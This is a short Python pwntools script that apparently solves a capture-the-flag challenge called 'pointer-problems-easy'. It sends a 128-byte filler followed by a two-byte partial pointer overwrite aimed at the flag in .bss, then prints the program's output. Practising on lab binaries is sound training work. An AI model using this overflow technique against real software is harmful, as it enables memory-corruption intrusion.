from pwn import *

flag_bss_offset = b"\x60\x10"
input_offset = 128

p = process("./pointer-problems-easy")

print(p.clean())

payload = b""
payload += b"\x90" * input_offset
payload += flag_bss_offset

p.sendline(str(input_offset + 2).encode())
p.send(payload)

print(p.clean())

p.close()
